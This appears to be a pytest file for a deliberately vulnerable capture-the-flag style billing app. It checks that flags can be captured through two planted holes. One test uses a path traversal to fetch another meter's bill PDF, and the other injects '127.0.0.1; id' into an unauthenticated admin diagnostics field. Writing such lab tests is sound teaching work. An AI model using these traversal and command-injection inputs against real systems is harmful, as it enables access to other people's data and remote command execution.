import io

from pypdf import PdfReader


def test_traversal_teach(devon, alice, base_url, extract_flag_fn, redeem_flag_fn):
    resp = devon.get(
        f"{base_url}/bills/download",
        params={"path": "MTR-1004/../MTR-1002/2026-09.pdf"},
        timeout=10,
    )
    assert resp.status_code == 200
    assert resp.headers.get("Content-Type", "").startswith("application/pdf")

    reader = PdfReader(io.BytesIO(resp.content))
    text = "\n".join(page.extract_text() or "" for page in reader.pages)
    flag = extract_flag_fn(text)
    assert redeem_flag_fn(devon, base_url, flag)


def test_cmdinject_exercise(anon_session, alice, base_url, extract_flag_fn, redeem_flag_fn):
    resp = anon_session.post(f"{base_url}/admin/diagnostics", data={"host": "127.0.0.1; id"}, timeout=15)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)
